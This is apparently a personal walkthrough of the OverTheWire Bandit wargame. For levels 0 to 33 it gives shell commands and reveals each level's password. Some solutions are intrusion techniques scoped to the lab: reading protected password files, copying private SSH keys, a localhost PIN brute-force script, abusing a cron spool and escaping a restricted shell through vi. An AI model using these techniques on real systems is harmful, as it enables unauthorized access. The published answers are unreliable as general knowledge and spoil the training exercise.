# Level 0 -> 1
``` bash
cat readme
```
<details><summary>Password</summary>ZjLjTmM6FvvyRnrb2rfNWOZOTa6ip5If </details>

# Level 1 -> 2
``` bash
cat ./-
# or
cat /home/bandit1/-
```
<details>   <summary>Password</summary>263JGJPfgU6LtdEvgfWU1XP5yac29mFx </details>

# Level 2 -> 3
``` bash
cat ./--spaces\ in\ this\ filename--
# or
cat /home/bandit2/--spaces\ in\ this\ filename-- 
```
<details>   <summary>Password</summary>MNk8KNH3Usiio41PRUEoDFPqfxLPlSmx </details>

# Level 3 -> 4
``` bash
cd inhere

ls -la

cat ./...Hiding-From-You
```
<details>   <summary>Password</summary>2WmrDFRmJIq3IPxneAaMGhap0pFhF3NJ </details>

# Level 4 -> 5
``` bash
cd inhere

file ./*

cat ./-file07
```
<details>   <summary>Password</summary>4oQYVPkxZOOEOO5pTW81FB8j8lxXGUQw </details>

# Level 5 -> 6
``` bash
cd inhere

find / -type f -size 1033c \! -executable -exec file {} \;

cat ./maybehere07/.file2

```
<details>   <summary>Password</summary>HWasnPhtq9AVKe0dmk45nxy20cvUa6EG </details>

# Level 6 -> 7
``` bash
find / -type f -size 33c -user bandit7 -group bandit6 -ls 2>/dev/null

cat /var/lib/dpkg/info/bandit7.password
```
<details>   <summary>Password</summary>morbNTDkSW6jIlUc0ymOdMaLnOlFVAaj </details>

# Level 7 -> 8
``` bash
grep "millionth" data.txt
```
<details>   <summary>Password</summary>dfwvzFQi4mU0wfNbFOe9RoWskMLg7eEc </details>

# Level 8 -> 9
``` bash
cat data.txt | sort | uniq -u
```
<details>   <summary>Password</summary>4CKMh1JI91bUIZZPXDqGanal4xvAg0JM </details>

# Level 9 -> 10
``` bash
strings data.txt | grep "="
# or
grep "=" <<< $(strings data.txt)
```
<details>   <summary>Password</summary>FGUW5ilLVJrxX9kMYMmlN4MgbpfMiqey </details>

# Level 10 -> 11
``` bash
base64 -d data.txt
```
<details>   <summary>Password</summary>dtR173fZKb0RRsDFSGsg2RWnpNVj3qRr </details>

# Level 11 -> 12
``` bash
tr "[a-zA-Z]" "[n-za-mN-ZA-M]" < data.txt
```
<details>
  <summary>Password</summary>
  7x16WNeHIi5YkIhWsfFIqoognUTyj9Q4
</details>

# Level 12 -> 13
``` bash
mktemp -d # /tmp/tmp.shncx3r7dz

cd /tmp/tmp.shncx3r7dz

xxd -r ~/data.txt > ./data

file ./data # gzip
mv ./data ./data.gz
gunzip ./data.gz # new file data

file ./data # bzip2
bunzip2 ./data # new file data.out

file ./data.out # gzip
mv ./data.out ./data.gz
gunzip ./data.gz # new file data

file ./data # POSIX tar archive
tar xvf ./data # new file data5.bin

file ./data5.bin # POSIX tar archive
tar xvf ./data5.bin # new file data6.bin

file ./data6.bin # bzip2
bunzip ./data6.bin # new file data6.bin.out

file ./data6.bin.out # POSIX tar archive
tar xvf ./data6.bin.out # new file data8.bin

file ./data8.bin # gzip
mv ./data8.bin ./data8.gz
gunzip ./data8.gz # new file data8

file ./data8 # ASCII text
cat ./data8


```
<details>   <summary>Password</summary>FO5dwFsc0cbaIiH0h8J2eUks2vdTDwAn </details>

# Level 13-14
``` bash
ls -la # we see a private ssh key: sshkey.private

exit # logging out from ssh connection

scp -P 2220 bandit13:bandit.labs.overthewire.org:~/sshkey.private .\sshkey14.private # Backslash becaucse im on Windows, 14 because its for the bandit14 user

ssh -i ./sshkey14.private -p 2220 bandit14@bandit.labs.overthewire.org

cat /etc/bandit_pass/bandit14
```
<details>   <summary>Password</summary>MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS </details>

# Level 14-15
```bash
nc localhost 30000
> MU4VWeTyJk8ROof1qqmcBPaLh7lDCPvS
```
<details>   <summary>Password</summary>8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo</details>

# Level 15-16
``` bash
openssl s_client localhost:30001
> 8xCjnmgoKbGLhHFAZlGE5Tmu4M2tKJQo
```
<details>   <summary>Password</summary>kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx</details>

# Level 16-17
```
nmap -p31000-32000 sV localhost

openssl s_client -ign_eof localhost:31790
> kSkvUpMQ7lBYyCM4GBPvCvT1BfWRy0Dx
# we receive a private key again
# safe private key locally in file e.g sshkey17.private

ssh -i ./sshkey17.private -p 2220 bandit17@bandit.labs.overthewire.org

cat /etc/bandit_pass/bandit17
```
<details>   <summary>Password</summary>EReVavePLFHtFlFsjn3hyzMlvSuSAcRD</details>

# Level 17-18
``` bash
diff passwords.old passwords.new
```
<details>   <summary>Password</summary>x2gLTTjFwMOhQ8oWNbMN362QKxfRqGlO</details>

# Level 17-18
``` bash
ssh -p 2220 bandit18@bandit.labs.overthewire.org "cat ~/readme"
```
<details>   <summary>Password</summary>cGWpMaKXVwDUNgPAVJbWYuGHVn9zl3j8</details>

# Level 18-19
``` bash
./bandit20-do
# Run a command as another user.
# Example: ./bandit20.do whoami

./bandit20-do whoam
# bandit20

./bandit20-do cat /etc/bandit_pass/bandit20
```
<details>   <summary>Password</summary>0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO</details>

# Level 20-21
``` bash
# we use two terminals, both are connected to bandit20

#terminal 1
nc -lvnp 1337

# terminal 2
./suconnect 1337

# terminal 1
# a connection should have been established
> 0qXahG8ZjOVMN9Ghs7iOWsCfZyXOUbYO
```
<details>   <summary>Password</summary>EeoULMCra2q0dSkYj561DX7s1CpBuOBt</details>

# Level 21-22
``` bash
cat /etc/cron.d/cronjob_bandit22.sh

cat /usr/bin/cronjob_bandit22.sh

cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
<details>   <summary>Password</summary>tRae0UfB9v0UzbCdn9cY0gQnds9GF58Q</details>

# Level 22-23
``` bash
cat /etc/cron.d/cronjob_bandit23

cat /usr/bin/cronjob_bandit23.sh
# mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

md5sum <<< "I am user bandit23"
# 8ca319486bfbbc3663ea0fbe81326349

cat /tmp/8ca319486bfbbc3663ea0fbe81326349
```
<details>   <summary>Password</summary>0Zf11ioIjMVN551jX3CmStKLYqjk54Ga</details>

# Level 23-24
``` bash
cat /etc/cron.d/cronjob_bandit24

cat /usr/bin/cronjob_bandit24.sh
# executes all files from user bandit23 and deletes them after 60 sec in the diretory /var/spool/bandit24/foo

ls -la /var/spool/bandit24
#bandit23 has read perms in /var/spool/bandit24
#bandit23 hast write perms in /var/spool/bandit24/foo
#bandit24 hast read perms in /var/spool/bandit24

cd $(mktemp -d)
```
create file in tmp directory bash.sh
``` bash
#!/usr/bin/bash

cat /etc/bandit_pass/bandtit24 > /path/to/tmp/directory/bandit24password.txt
```
change perms for the tmp directory and the bash.sh file and copy it to /var/spool/bandit24/foo
```
chmod o+rwx /path/to/tmp/directory

chmod +x bash.sh

cp bash.sh /var/spool/bandit24/foo/bash.sh
```
wait a minute and a new file called bandit24password.txt should have been created in you tmp directory with the password in it
<details>   <summary>Password</summary>gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8</details>

# Level 24-25
``` bash
#!/usr/bin/bash

# addr: localhost
# port: 30002
PASS="gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8"

write_data()
{
	printf "%s %04d\n" "$PASS" "$1" >&5
	printf "\r%s %04d" "$PASS" "$1"
}

read_data()
{
	IFS= read -r response <&5 || return 1
	printf "%s\n" "$response"
}

exec 5<>/dev/tcp/127.0.0.1/30002

IFS= read -r response <&5 || return 1 #throw away first line

for i in {0..10000}
do
	write_data $i
	answer=$(read_data)

	if [[ ! $answer == *"Wrong"* ]];
	then
		echo ""
		echo "found pincode: $i"
		echo "full code: $PASS $i"
		exit
	fi
done
```
<details>   <summary>Password</summary>iCi86ttT4KSNe1armKiwbQNmB3YJP3q4</details>

# Level 25 -> 26
``` bash
grep bandit26 /etc/passwd
# we see bandit26 has a /usr/bin/showtext shell???

cat /usr/bin/showtext
# executes more ~/text.txt

ls -la ~
# private bandit26 key in bandit25 home dir, lets download it

scp -P 2220 bandit25@bandit.labs.overthewire.org:~/bandit26.sshkey ./bandit26.sshkey

# now make the terminal window as small as possible and log into bandit26
ssh -i bandit26.sshkey -p 2220 bandit26@bandit.labs.overthewire.org
# more should start interactively
# type following to start vi/vim
v
:set shell=/bin/bash
:shell
# you now have a shell

cat /etc/bandit_pass/bandit26
```
<details>   <summary>Password</summary>s0773xxkk0MXfdqOfPRVr9L3jJBUOgCZ</details>

# Level 26 -> 27
``` bash
ls -la
# we see the executable file bandit27-do

./bandit27-do cat /etc/bandit_pass/bandit27
```
<details>   <summary>Password</summary>upsNCc7vzaRDx6oZC6GiR6ERwe1MowGB</details>

# Level 27 -> 28
``` bash
# from your local machine
git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo

cat repo/README
```
<details>   <summary>Password</summary>Yz9IpL0sBcCeuG7m9uQFt8ZNpS4HZRcN</details>

# Level 28 -> 29
``` bash
git clone ssh://bandit28-git@bandit.labs.overthewire.org:2220/home/bandit28-git/repo

cd repo

cat README
# passwort is removed

git log
#see last commit "fix info leak", lets checkout the commit before this one

git checkout d0cf2ab7dd7ebc6075b59102a980155268f0fe8f

cat README
# passwort now visible
```
<details>   <summary>Password</summary>4pT1t5DENaYuqnqvadYs1oE4QLCdjmJ7</details>

# Level 29 -> 30
``` bash
git clone ssh://bandit29-git@bandit.labs.overthewire.org:2220/home/bandit29-git/repo

git branch -a

git checkout dev

cat README
```
<details>   <summary>Password</summary>qp30ex3VLz5MDG1n91YowTv4Q8l7CDZL</details>

# Level 30 -> 31
``` bash
git clone ssh://bandit30-git@bandit.labs.overthewire.org:2220/home/bandit30-git/rep

git tag
# or
cat ./.git/packed-refs
# we see the tag secret

git checkout tags/secret
#not working

git show secret
# password is displayed
```
<details>   <summary>Password</summary>fb5S2xb7bRyFmAvQYQGEqsbhVyJqhnDy</details>

# Level 31 -> 32
``` bash
git clone ssh://bandit31-git@bandit.labs.overthewire.org:2220/home/bandit31-git/repo

cd repo

# we find these info in the .gitignore of the bandit31 home directory
git config --local --add user.name "Bandit31"
git config -local --add user.name "Bandit31@overthewire.org"

# on linux its easy
echo "May I come in?" > key.txt
# windows on the other hands adds some binary values we dont want in our file. I used HxD to get rid of them
# key.txt in Hex: 
00000000   FF FE 4D 00 61 00 79 00 20 00 49 00 20 00 63 00  .þM.a.y. .I. .c.
00000010   6F 00 6D 00 65 00 20 00 69 00 6E 00 3F 00 0D 00  o.m.e. .i.n.?...
00000020   0A 00                                            ..

# final key.txt in Hex:
00000000   4D 61 79 20 49 20 63 6F 6D 65 20 69 6E 3F 0A     May I come in?.

# now we can add the key.txt
git add -f ./key.txt

git commit -m "new file"

git push origin master
```
<details>   <summary>Password</summary>3O9RfhqyAlVBEZpVb6LYStshZoqoSx5K</details>

# Level 32 -> 33
``` bash
# every command we execute will be executed in all caps
$0
# and we have a shell

cat /etc/bandit_pass/bandit33
```
<details>   <summary>Password</summary>tQdtbs5D5i2vJwkO8mEyYEyTL8izoeJ0</details>
